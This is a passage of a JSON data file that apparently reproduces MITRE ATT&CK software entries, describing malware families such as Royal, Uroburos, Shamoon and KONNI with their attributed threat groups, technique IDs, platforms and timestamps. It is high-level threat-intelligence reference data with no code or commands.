      "url": "https://attack.mitre.org/software/S0269",
      "stix_id": "malware--7e6c2a9d-9dc1-4eb0-b27c-91e8076a9d77",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-16T20:38:19.712000+00:00"
    },
    "S1210": {
      "id": "S1210",
      "name": "Sagerunex",
      "description": "[Sagerunex](https://attack.mitre.org/software/S1210) is a malware family exclusively associated with [Lotus Blossom](https://attack.mitre.org/groups/G0030) operations, with variants existing since at least 2016. Variations of [Sagerunex](https://attack.mitre.org/software/S1210) leverage non-traditional command and control mechanisms such as various web services.(Citation: Symantec Bilbug 2022)(Citation: Cisco LotusBlossom 2025)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1090",
        "T1041",
        "T1016",
        "T1071.001",
        "T1027.013",
        "T1106",
        "T1055.001",
        "T1057",
        "T1027.002",
        "T1102.003",
        "T1140",
        "T1082",
        "T1134",
        "T1573.002",
        "T1074.001",
        "T1480",
        "T1560.001",
        "T1102.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1210",
      "stix_id": "malware--7f269253-c225-45ff-87c2-5e8ef6dd369f",
      "created": "2025-03-15T15:28:10.549000+00:00",
      "modified": "2025-03-16T09:54:28.094000+00:00"
    },
    "S0586": {
      "id": "S0586",
      "name": "TAINTEDSCRIBE",
      "description": "[TAINTEDSCRIBE](https://attack.mitre.org/software/S0586) is a fully-featured beaconing implant integrated with command modules used by [Lazarus Group](https://attack.mitre.org/groups/G0032). It was first reported in May 2020.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1018",
        "T1027.001",
        "T1070.006",
        "T1083",
        "T1560",
        "T1057",
        "T1036.005",
        "T1547.001",
        "T1059.003",
        "T1573.001",
        "T1001.003",
        "T1105",
        "T1124",
        "T1008",
        "T1070.004",
        "T1082"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0586",
      "stix_id": "malware--7f4bbe05-1674-4087-8a16-8f1ad61b6152",
      "created": "2021-03-05T15:56:44.479000+00:00",
      "modified": "2025-04-25T14:43:52.174000+00:00"
    },
    "S0060": {
      "id": "S0060",
      "name": "Sys10",
      "description": "[Sys10](https://attack.mitre.org/software/S0060) is a backdoor that was used throughout 2013 by [Naikon](https://attack.mitre.org/groups/G0019). (Citation: Baumgartner Naikon 2015)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573.001",
        "T1069.001",
        "T1082",
        "T1016",
        "T1071.001",
        "T1033"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0060",
      "stix_id": "malware--7f8730af-f683-423f-9ee1-5f6875a80481",
      "created": "2017-05-31T21:32:40.391000+00:00",
      "modified": "2025-04-25T14:43:52.533000+00:00"
    },
    "S0067": {
      "id": "S0067",
      "name": "pngdowner",
      "description": "[pngdowner](https://attack.mitre.org/software/S0067) is malware used by [Putter Panda](https://attack.mitre.org/groups/G0024). It is a simple tool with limited functionality and no persistence mechanism, suggesting it is used only as a simple \"download-and-\nexecute\" utility. (Citation: CrowdStrike Putter Panda)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1070.004",
        "T1552.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0067",
      "stix_id": "malware--800bdfba-6d66-480f-9f45-15845c05cb5d",
      "created": "2017-05-31T21:32:44.700000+00:00",
      "modified": "2025-04-25T14:43:52.893000+00:00"
    },
    "S1073": {
      "id": "S1073",
      "name": "Royal",
      "description": "[Royal](https://attack.mitre.org/software/S1073) is ransomware that first appeared in early 2022;  a version that also targets ESXi servers was later observed in February 2023. [Royal](https://attack.mitre.org/software/S1073) employs partial encryption and multiple threads to evade detection and speed encryption. [Royal](https://attack.mitre.org/software/S1073) has been used in attacks against multiple industries worldwide--including critical infrastructure. Security researchers have identified similarities in the encryption routines and TTPs used in [Royal](https://attack.mitre.org/software/S1073) and [Conti](https://attack.mitre.org/software/S0575) attacks and noted a possible connection between their operators.(Citation: Microsoft Royal ransomware November 2022)(Citation: Cybereason Royal December 2022)(Citation: Kroll Royal Deep Dive February 2023)(Citation: Trend Micro Royal Linux ESXi February 2023)(Citation: CISA Royal AA23-061A March 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1486",
        "T1489",
        "T1082",
        "T1059.012",
        "T1021.002",
        "T1046",
        "T1490",
        "T1135",
        "T1016",
        "T1106",
        "T1095",
        "T1566",
        "T1057",
        "T1083"
      ],
      "platforms": [
        "Windows",
        "ESXi"
      ],
      "url": "https://attack.mitre.org/software/S1073",
      "stix_id": "malware--802a874d-7463-4f2a-99e3-6a1f5a919a21",
      "created": "2023-03-30T20:25:37.761000+00:00",
      "modified": "2025-04-16T20:38:20.361000+00:00"
    },
    "S0574": {
      "id": "S0574",
      "name": "BendyBear",
      "description": "[BendyBear](https://attack.mitre.org/software/S0574) is an x64 shellcode for a stage-zero implant designed to download malware from a C2 server. First discovered in August 2020, [BendyBear](https://attack.mitre.org/software/S0574) shares a variety of features with [Waterbear](https://attack.mitre.org/software/S0579), malware previously attributed to the Chinese cyber espionage group [BlackTech](https://attack.mitre.org/groups/G0098).(Citation: Unit42 BendyBear Feb 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1105",
        "T1497.003",
        "T1001.001",
        "T1571",
        "T1027.014",
        "T1573.001",
        "T1012",
        "T1027.013",
        "T1106",
        "T1124"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0574",
      "stix_id": "malware--805480f1-6caa-4a67-8ca9-b2b39650d986",
      "created": "2021-02-16T16:50:29.990000+00:00",
      "modified": "2024-04-11T02:54:10.246000+00:00"
    },
    "S0022": {
      "id": "S0022",
      "name": "Uroburos",
      "description": "[Uroburos](https://attack.mitre.org/software/S0022) is a sophisticated cyber espionage tool written in C that has been used by units within Russia's Federal Security Service (FSB) associated with the [Turla](https://attack.mitre.org/groups/G0010) toolset to collect intelligence on sensitive targets worldwide. [Uroburos](https://attack.mitre.org/software/S0022) has several variants and has undergone nearly constant upgrade since its initial development in 2003 to keep it viable after public disclosures. [Uroburos](https://attack.mitre.org/software/S0022) is typically deployed to external-facing nodes on a targeted network and has the ability to leverage additional tools and TTPs to further exploit an internal network. [Uroburos](https://attack.mitre.org/software/S0022) has interoperable implants for Windows, Linux, and macOS, employs a high level of stealth in communications and architecture, and can easily incorporate new or replacement components.(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023)(Citation: Kaspersky Turla)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573.002",
        "T1620",
        "T1106",
        "T1005",
        "T1027.002",
        "T1095",
        "T1071.003",
        "T1001.001",
        "T1573.001",
        "T1071.001",
        "T1090.003",
        "T1059.003",
        "T1564.005",
        "T1027.011",
        "T1112",
        "T1036.004",
        "T1132.002",
        "T1012",
        "T1559",
        "T1082",
        "T1104",
        "T1001.003",
        "T1008",
        "T1543.003",
        "T1105",
        "T1572",
        "T1140",
        "T1055.001",
        "T1205",
        "T1057",
        "T1014",
        "T1027.013",
        "T1070.004",
        "T1071.004",
        "T1083",
        "T1027.009"
      ],
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0022",
      "stix_id": "malware--80a014ba-3fef-4768-990b-37d8bd10d7f4",
      "created": "2017-05-31T21:32:19.029000+00:00",
      "modified": "2024-04-10T22:18:48.304000+00:00"
    },
    "S0455": {
      "id": "S0455",
      "name": "Metamorfo",
      "description": "[Metamorfo](https://attack.mitre.org/software/S0455) is a Latin-American banking trojan operated by a Brazilian cybercrime group that has been active since at least April 2018. The group focuses on targeting banks and cryptocurrency services in Brazil and Mexico.(Citation: Medium Metamorfo Apr 2020)(Citation: ESET Casbaneiro Oct 2019) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.007",
        "T1518",
        "T1056.001",
        "T1518.001",
        "T1573.002",
        "T1071.001",
        "T1218.007",
        "T1204.002",
        "T1055.001",
        "T1102.001",
        "T1027.013",
        "T1106",
        "T1574.001",
        "T1566.001",
        "T1124",
        "T1095",
        "T1547.001",
        "T1041",
        "T1070",
        "T1056.002",
        "T1497",
        "T1070.004",
        "T1112",
        "T1102.003",
        "T1119",
        "T1571",
        "T1218.005",
        "T1115",
        "T1129",
        "T1082",
        "T1562.001",
        "T1565.002",
        "T1113",
        "T1553.002",
        "T1059.003",
        "T1027.002",
        "T1010",
        "T1033",
        "T1036.005",
        "T1105",
        "T1057",
        "T1573.001",
        "T1059.005",
        "T1564.003",
        "T1140",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0455",
      "stix_id": "malware--81c57a96-fc8c-4f91-af8e-63e24c2927c2",
      "created": "2020-05-26T17:34:19.044000+00:00",
      "modified": "2024-04-11T00:44:30.028000+00:00"
    },
    "S1140": {
      "id": "S1140",
      "name": "Spica",
      "description": "[Spica](https://attack.mitre.org/software/S1140) is a custom backdoor written in Rust that has been used by [Star Blizzard](https://attack.mitre.org/groups/G1033) since at least 2023.(Citation: Google TAG COLDRIVER January 2024) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.001",
        "T1105",
        "T1560",
        "T1083",
        "T1539",
        "T1053.005",
        "T1036.004",
        "T1095",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1140",
      "stix_id": "malware--824a230d-0f6a-4fd0-99df-8d464db2265e",
      "created": "2024-06-18T20:03:12.865000+00:00",
      "modified": "2024-06-18T20:03:31.986000+00:00"
    },
    "S0094": {
      "id": "S0094",
      "name": "Trojan.Karagany",
      "description": "[Trojan.Karagany](https://attack.mitre.org/software/S0094) is a modular remote access tool used for recon and linked to [Dragonfly](https://attack.mitre.org/groups/G0035). The source code for [Trojan.Karagany](https://attack.mitre.org/software/S0094) originated from Dream Loader malware which was leaked in 2010 and sold on underground forums. (Citation: Symantec Dragonfly)(Citation: Secureworks Karagany July 2019)(Citation: Dragos DYMALLOY )",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1033",
        "T1113",
        "T1049",
        "T1010",
        "T1027",
        "T1027.002",
        "T1555.003",
        "T1057",
        "T1547.001",
        "T1082",
        "T1070.004",
        "T1105",
        "T1056.001",
        "T1083",
        "T1074.001",
        "T1055.003",
        "T1573.002",
        "T1497.001",
        "T1003",
        "T1016",
        "T1059.003",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0094",
      "stix_id": "malware--82cb34ba-02b5-432b-b2d2-07f55cbf674d",
      "created": "2017-05-31T21:33:00.176000+00:00",
      "modified": "2025-04-16T20:38:20.519000+00:00"
    },
    "S0234": {
      "id": "S0234",
      "name": "Bandook",
      "description": "[Bandook](https://attack.mitre.org/software/S0234) is a commercially available RAT, written in Delphi and C++, that has been available since at least 2007. It has been used against government, financial, energy, healthcare, education, IT, and legal organizations in the US, South America, Europe, and Southeast Asia. [Bandook](https://attack.mitre.org/software/S0234) has been used by [Dark Caracal](https://attack.mitre.org/groups/G0070), as well as in a separate campaign referred to as \"Operation Manul\".(Citation: EFF Manul Aug 2016)(Citation: Lookout Dark Caracal Jan 2018)(Citation: CheckPoint Bandook Nov 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1123",
        "T1041",
        "T1059.003",
        "T1056.001",
        "T1055.012",
        "T1105",
        "T1120",
        "T1027.003",
        "T1083",
        "T1095",
        "T1566.001",
        "T1059",
        "T1113",
        "T1016",
        "T1059.001",
        "T1082",
        "T1204.002",
        "T1106",
        "T1059.005",
        "T1125",
        "T1059.006",
        "T1070.004",
        "T1573.001",
        "T1140",
        "T1005",
        "T1553.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0234",
      "stix_id": "malware--835a79f1-842d-472d-b8f4-d54b545c341b",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:43:54.316000+00:00"
    },
    "S0501": {
      "id": "S0501",
      "name": "PipeMon",
      "description": "[PipeMon](https://attack.mitre.org/software/S0501) is a multi-stage modular backdoor used by [Winnti Group](https://attack.mitre.org/groups/G0044).(Citation: ESET PipeMon May 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1134.002",
        "T1082",
        "T1112",
        "T1027.013",
        "T1105",
        "T1055.001",
        "T1547.012",
        "T1095",
        "T1548.002",
        "T1057",
        "T1124",
        "T1573.001",
        "T1134.004",
        "T1140",
        "T1106",
        "T1027.011",
        "T1543.003",
        "T1553.002",
        "T1008",
        "T1036.005",
        "T1016",
        "T1518.001",
        "T1129"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0501",
      "stix_id": "malware--8393dac0-0583-456a-9372-fd81691bca20",
      "created": "2020-08-24T13:15:51.706000+00:00",
      "modified": "2024-04-11T00:26:37.214000+00:00"
    },
    "S0519": {
      "id": "S0519",
      "name": "SYNful Knock",
      "description": "[SYNful Knock](https://attack.mitre.org/software/S0519) is a stealthy modification of the operating system of network devices that can be used to maintain persistence within a victim's network and provide new capabilities to the adversary.(Citation: Mandiant - Synful Knock)(Citation: Cisco Synful Knock Evolution)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1601.001",
        "T1205",
        "T1556.004"
      ],
      "platforms": [
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S0519",
      "stix_id": "malware--84c1ecc6-e5a2-4e8a-bf4b-651a618e0053",
      "created": "2020-10-19T16:38:11.279000+00:00",
      "modified": "2025-04-15T19:46:34.695000+00:00"
    },
    "S1182": {
      "id": "S1182",
      "name": "MagicRAT",
      "description": "[MagicRAT](https://attack.mitre.org/software/S1182) is a remote access tool developed in C++ and exclusively used by the [Lazarus Group](https://attack.mitre.org/groups/G0032) threat actor in operations. [MagicRAT](https://attack.mitre.org/software/S1182) allows for arbitrary command execution on victim machines and provides basic remote access functionality.(Citation: Cisco MagicRAT 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.004",
        "T1105",
        "T1036.005",
        "T1059.003",
        "T1027.013",
        "T1053.005",
        "T1071.001",
        "T1016",
        "T1041",
        "T1547.001",
        "T1082",
        "T1140",
        "T1036.008"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1182",
      "stix_id": "malware--858b0f9d-3a2a-437e-a058-afe72154f6da",
      "created": "2024-12-30T19:36:12.999000+00:00",
      "modified": "2025-04-10T21:36:18.962000+00:00"
    },
    "S0131": {
      "id": "S0131",
      "name": "TINYTYPHON",
      "description": "[TINYTYPHON](https://attack.mitre.org/software/S0131) is a backdoor  that has been used by the actors responsible for the MONSOON campaign. The majority of its code was reportedly taken from the MyDoom worm. (Citation: Forcepoint Monsoon)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027.013",
        "T1083",
        "T1547.001",
        "T1020"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0131",
      "stix_id": "malware--85b39628-204a-48d2-b377-ec368cbcb7ca",
      "created": "2017-05-31T21:33:15.467000+00:00",
      "modified": "2024-04-10T22:32:05.321000+00:00"
    },
    "S0356": {
      "id": "S0356",
      "name": "KONNI",
      "description": "[KONNI](https://attack.mitre.org/software/S0356) is a remote access tool that security researchers assess has been used by North Korean cyber actors since at least 2014. [KONNI](https://attack.mitre.org/software/S0356) has significant code overlap with the [NOKKI](https://attack.mitre.org/software/S0353) malware family, and has been linked to several suspected North Korean campaigns targeting political organizations in Russia, East Asia, Europe and the Middle East; there is some evidence potentially linking [KONNI](https://attack.mitre.org/software/S0356) to [APT37](https://attack.mitre.org/groups/G0067).(Citation: Talos Konni May 2017)(Citation: Unit 42 NOKKI Sept 2018)(Citation: Unit 42 Nokki Oct 2018)(Citation: Medium KONNI Jan 2020)(Citation: Malwarebytes Konni Aug 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1204.002",
        "T1082",
        "T1546.015",
        "T1016",
        "T1048.003",
        "T1049",
        "T1555.003",
        "T1005",
        "T1134.004",
        "T1027.002",
        "T1548.002",
        "T1071.001",
        "T1033",
        "T1070.004",
        "T1547.001",
        "T1027.013",
        "T1115",
        "T1036.004",
        "T1057",
        "T1059.001",
        "T1112",
        "T1560",
        "T1105",
        "T1106",
        "T1543.003",
        "T1132.001",
        "T1113",
        "T1059.003",
        "T1566.001",
        "T1218.011",
        "T1134.002",
        "T1041",
        "T1573.001",
        "T1083",
        "T1547.009",
        "T1056.001",
        "T1059.007",
        "T1036.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0356",
      "stix_id": "malware--86b92f6c-9c05-4c51-b361-4c7bb13e21a1",
      "created": "2019-01-31T00:36:39.771000+00:00",
      "modified": "2024-04-11T01:44:46.026000+00:00"
    },
    "S0098": {
      "id": "S0098",
      "name": "T9000",
      "description": "[T9000](https://attack.mitre.org/software/S0098) is a backdoor that is a newer variant of the T5000 malware family, also known as Plat1. Its primary function is to gather information about the victim. It has been used in multiple targeted attacks against U.S.-based organizations. (Citation: FireEye admin@338 March 2014) (Citation: Palo Alto T9000 Feb 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1124",
        "T1119",
        "T1546.010",
        "T1082",
        "T1574.001",
        "T1518.001",
        "T1123",
        "T1033",
        "T1560.003",
        "T1113",
        "T1125",
        "T1120"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0098",
      "stix_id": "malware--876f6a77-fbc5-4e13-ab1a-5611986730a3",
      "created": "2017-05-31T21:33:01.951000+00:00",
      "modified": "2025-04-25T14:43:55.595000+00:00"
    },
    "S0430": {
      "id": "S0430",
      "name": "Winnti for Linux",
      "description": "[Winnti for Linux](https://attack.mitre.org/software/S0430) is a trojan, seen since at least 2015, designed specifically for targeting Linux systems. Reporting indicates the winnti malware family is shared across a number of actors including [Winnti Group](https://attack.mitre.org/groups/G0044). The Windows variant is tracked separately under [Winnti for Windows](https://attack.mitre.org/software/S0141).(Citation: Chronicle Winnti for Linux May 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1095",
        "T1140",
        "T1573.001",
        "T1205",
        "T1027.013",
        "T1105",
        "T1014"
      ],
      "platforms": [
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0430",
      "stix_id": "malware--8787e86d-8475-4f13-acea-d33eb83b6105",
      "created": "2020-04-29T15:06:59.171000+00:00",
      "modified": "2024-04-10T20:36:12.150000+00:00"
    },
    "S1113": {
      "id": "S1113",
      "name": "RAPIDPULSE",
      "description": "[RAPIDPULSE](https://attack.mitre.org/software/S1113) is a web shell that exists as a modification to a legitimate Pulse Secure file that has been used by [APT5](https://attack.mitre.org/groups/G1023) since at least 2021.(Citation: Mandiant Pulse Secure Update May 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1005",
        "T1505.003",
        "T1027.013"
      ],
      "platforms": [
        "Network Devices",
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S1113",
      "stix_id": "malware--880f7b3e-ad27-4158-8b03-d44c9357950b",
      "created": "2024-02-13T17:50:25.350000+00:00",
      "modified": "2025-04-15T19:46:34.778000+00:00"
    },
    "S0032": {
      "id": "S0032",
      "name": "gh0st RAT",
      "description": "[gh0st RAT](https://attack.mitre.org/software/S0032) is a remote access tool (RAT). The source code is public and it has been used by multiple groups.(Citation: FireEye Hacking Team)(Citation: Arbor Musical Chairs Feb 2018)(Citation: Nccgroup Gh0st April 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1129",
        "T1112",
        "T1105",
        "T1055",
        "T1218.011",
        "T1569.002",
        "T1574.001",
        "T1059",
        "T1012",
        "T1140",
        "T1573.001",
        "T1095",
        "T1106",
        "T1057",
        "T1543.003",
        "T1547.001",
        "T1070.001",
        "T1082",
        "T1070.004",
        "T1113",
        "T1568.001",
        "T1056.001",
        "T1132.001",
        "T1573"
      ],
      "platforms": [
        "Windows",
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0032",
      "stix_id": "malware--88c621a7-aef9-4ae0-94e3-1fc87123eb24",
      "created": "2017-05-31T21:32:24.937000+00:00",
      "modified": "2024-05-07T19:07:45.403000+00:00"
    },
    "S0140": {
      "id": "S0140",
      "name": "Shamoon",
      "description": "[Shamoon](https://attack.mitre.org/software/S0140) is wiper malware that was first used by an Iranian group known as the \"Cutting Sword of Justice\" in 2012. Other versions known as Shamoon 2 and Shamoon 3 were observed in 2016 and 2018. [Shamoon](https://attack.mitre.org/software/S0140) has also been seen leveraging [RawDisk](https://attack.mitre.org/software/S0364) and Filerase to carry out data wiping tasks. Analysis has linked [Shamoon](https://attack.mitre.org/software/S0140) with [Kwampirs](https://attack.mitre.org/software/S0236) based on multiple shared artifacts and coding patterns.(Citation: Cylera Kwampirs 2022) The term Shamoon is sometimes used to refer to the group using the malware as well as the malware itself.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Unit 42 Shamoon3 2018)(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1124",
        "T1561.002",
        "T1082",
        "T1012",
        "T1021.002",
        "T1036.004",
        "T1105",
        "T1485",
        "T1543.003",
        "T1016",
        "T1027",
        "T1078.002",
        "T1569.002",
        "T1134.001",
        "T1570",
        "T1053.005",
        "T1140",
        "T1112",
        "T1548.002",
        "T1529",
        "T1486",
        "T1018",
        "T1070.006",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0140",
      "stix_id": "malware--8901ac23-6b50-410c-b0dd-d8174a86f9b3",
      "created": "2017-05-31T21:33:20.223000+00:00",
      "modified": "2024-11-17T16:07:44.262000+00:00"
    },
    "S0007": {
      "id": "S0007",
      "name": "Skeleton Key",
      "description": "[Skeleton Key](https://attack.mitre.org/software/S0007) is malware used to inject false credentials into domain controllers with the intent of creating a backdoor password. (Citation: Dell Skeleton) Functionality similar to [Skeleton Key](https://attack.mitre.org/software/S0007) is included as a module in [Mimikatz](https://attack.mitre.org/software/S0002).",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1556.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0007",
      "stix_id": "malware--89f63ae4-f229-4a5c-95ad-6f22ed2b5c49",
      "created": "2017-05-31T21:32:13.407000+00:00",
      "modified": "2024-02-06T19:02:00.781000+00:00"
    },
    "S1021": {
      "id": "S1021",
      "name": "DnsSystem",
      "description": "[DnsSystem](https://attack.mitre.org/software/S1021) is a .NET based DNS backdoor, which is a customized version of the open source tool DIG.net, that has been used by [HEXANE](https://attack.mitre.org/groups/G1001) since at least June 2022.(Citation: Zscaler Lyceum DnsSystem June 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1132.001",
        "T1041",
        "T1105",
        "T1071.004",
        "T1059.003",
        "T1547.001",
        "T1033",
        "T1005",
        "T1204.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1021",
      "stix_id": "malware--8a2867f9-e8fc-4bf1-a860-ef6e46311900",
      "created": "2022-06-24T14:02:05.144000+00:00",
      "modified": "2025-04-16T20:38:21.017000+00:00"
    },
    "S0553": {
      "id": "S0553",
      "name": "MoleNet",
      "description": "[MoleNet](https://attack.mitre.org/software/S0553) is a downloader tool with backdoor capabilities that has been observed in use since at least 2019.(Citation: Cybereason Molerats Dec 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1059.003",
        "T1059.001",
        "T1547.001",
        "T1047",
        "T1105",
        "T1518.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0553",
      "stix_id": "malware--8a59f456-79a0-4151-9f56-9b1a67332af2",
      "created": "2020-12-28T22:09:15.461000+00:00",
      "modified": "2025-04-25T14:43:57.040000+00:00"
    },
    "S0212": {
      "id": "S0212",
      "name": "CORALDECK",
      "description": "[CORALDECK](https://attack.mitre.org/software/S0212) is an exfiltration tool used by [APT37](https://attack.mitre.org/groups/G0067). (Citation: FireEye APT37 Feb 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1048.003",
        "T1560.001",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0212",
      "stix_id": "malware--8ab98e25-1672-4b5f-a2fb-e60f08a5ea9e",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-11-17T15:01:33.390000+00:00"
    },
    "S0044": {
      "id": "S0044",
      "name": "JHUHUGIT",
      "description": "[JHUHUGIT](https://attack.mitre.org/software/S0044) is malware used by [APT28](https://attack.mitre.org/groups/G0007). It is based on Carberp source code and serves as reconnaissance malware. (Citation: Kaspersky Sofacy) (Citation: F-Secure Sofacy 2015) (Citation: ESET Sednit Part 1) (Citation: FireEye APT28 January 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1113",
        "T1008",
        "T1057",
        "T1016",
        "T1053.005",
        "T1132.001",
        "T1071.001",
        "T1547.001",
        "T1037.001",
        "T1115",
        "T1059.003",
        "T1068",
        "T1546.015",
        "T1027.013",
        "T1543.003",
        "T1055",
        "T1218.011",
        "T1082",
        "T1070.004",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0044",
      "stix_id": "malware--8ae43c46-57ef-47d5-a77a-eebb35628db2",
      "created": "2017-05-31T21:32:34.199000+00:00",
      "modified": "2024-11-17T14:43:38.591000+00:00"
    },
    "S0035": {
      "id": "S0035",
      "name": "SPACESHIP",
      "description": "[SPACESHIP](https://attack.mitre.org/software/S0035) is malware developed by [APT30](https://attack.mitre.org/groups/G0013) that allows propagation and exfiltration of data over removable devices. [APT30](https://attack.mitre.org/groups/G0013) may use this capability to exfiltrate data across air-gaps. (Citation: FireEye APT30)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1052.001",
        "T1560.003",
        "T1547.001",
        "T1547.009",
        "T1074.001",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0035",
      "stix_id": "malware--8b880b41-5139-4807-baa9-309690218719",
      "created": "2017-05-31T21:32:28.257000+00:00",
      "modified": "2024-11-17T15:05:25.107000+00:00"
    },
    "S0657": {
      "id": "S0657",
      "name": "BLUELIGHT",
      "description": "[BLUELIGHT](https://attack.mitre.org/software/S0657) is a remote access Trojan used by [APT37](https://attack.mitre.org/groups/G0067) that was first observed in early 2021.(Citation: Volexity InkySquid BLUELIGHT August 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1560.003",
        "T1033",
        "T1082",
        "T1105",
        "T1027.013",
        "T1041",
        "T1518.001",
        "T1070.004",
        "T1102.002",
        "T1539",
        "T1555.003",
        "T1057",
        "T1560",
        "T1497.001",
        "T1083",
        "T1071.001",
        "T1124",
        "T1113"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0657",
      "stix_id": "malware--8bd47506-29ae-44ea-a5c1-c57e8a1ab6b0",
      "created": "2021-10-01T20:26:49.502000+00:00",
      "modified": "2024-04-11T02:49:24.851000+00:00"
    },
    "S0526": {
      "id": "S0526",
      "name": "KGH_SPY",
      "description": "[KGH_SPY](https://attack.mitre.org/software/S0526) is a modular suite of tools used by [Kimsuky](https://attack.mitre.org/groups/G0094) for reconnaissance, information stealing, and backdoor capabilities. [KGH_SPY](https://attack.mitre.org/software/S0526) derived its name from PDB paths and internal names found in samples containing \"KGH\".(Citation: Cybereason Kimsuky November 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1036.005",
        "T1555.003",
        "T1059.003",
        "T1204.002",
        "T1037.001",
        "T1105",
        "T1071.001",
        "T1114.001",
        "T1083",
        "T1041",
        "T1027.013",
        "T1059.001",
        "T1555.004",
        "T1074.001",
        "T1518",
        "T1082",
        "T1005",
        "T1056.001",
        "T1140",
        "T1555"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0526",
      "stix_id": "malware--8bdfe255-e658-4ddd-a11c-b854762e451d",
      "created": "2020-11-06T18:58:35.456000+00:00",
      "modified": "2024-04-11T01:45:40.875000+00:00"
    },
    "S0472": {
      "id": "S0472",
      "name": "down_new",
      "description": " [down_new](https://attack.mitre.org/software/S0472) is a downloader that has been used by [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) since at least 2019.(Citation: Trend Micro Tick November 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1082",
        "T1132.001",
        "T1083",
        "T1057",
        "T1518.001",
        "T1071.001",
        "T1518",
        "T1016",
        "T1573.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0472",
      "stix_id": "malware--8be7c69e-d8e3-4970-9668-61de08e508cc",
      "created": "2020-06-10T19:37:49.361000+00:00",
      "modified": "2025-04-25T14:43:58.304000+00:00"
    },
    "S0015": {
      "id": "S0015",
      "name": "Ixeshe",
      "description": "[Ixeshe](https://attack.mitre.org/software/S0015) is a malware family that has been used since at least 2009 against targets in East Asia. (Citation: Moran 2013)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1057",
        "T1071.001",
        "T1070.004",
        "T1547.001",
        "T1082",
        "T1016",
        "T1105",
        "T1564.001",
        "T1132.001",
        "T1083",
        "T1007",
        "T1005",
